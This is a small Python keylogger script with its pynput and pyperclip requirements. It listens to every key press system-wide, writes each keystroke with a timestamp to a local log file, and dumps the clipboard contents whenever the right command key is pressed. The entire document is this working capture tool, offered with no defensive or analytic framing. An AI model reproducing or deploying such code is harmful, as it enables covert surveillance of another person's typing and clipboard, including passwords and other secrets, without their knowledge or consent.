pynput==1.7.1
pyperclip==1.8.1
import pyperclip
from datetime import datetime
from pynput.keyboard import Listener
KEYSTROKE_LOG_FILE = './logs/keystroke.log'

def log_key_press(key):
    # Process the key press, get contents of the clipboard
    key = str(key).replace("'", "")
    line_to_write = None
    now = str(datetime.now())
    if key == 'Key.cmd_r':
        line_to_write = f"{now}: Clipboard - {pyperclip.paste()}"
    else:
        line_to_write = f"{now}: Key Press - {key}"
    # Write the output to the file
    with open(KEYSTROKE_LOG_FILE, 'a') as f:
        f.write(f"{line_to_write}\n")

def start():
    # 1. Figure out how to track key presses
    with Listener(on_press=log_key_press) as l:
        l.join()
if __name__ == '__main__':
    start()
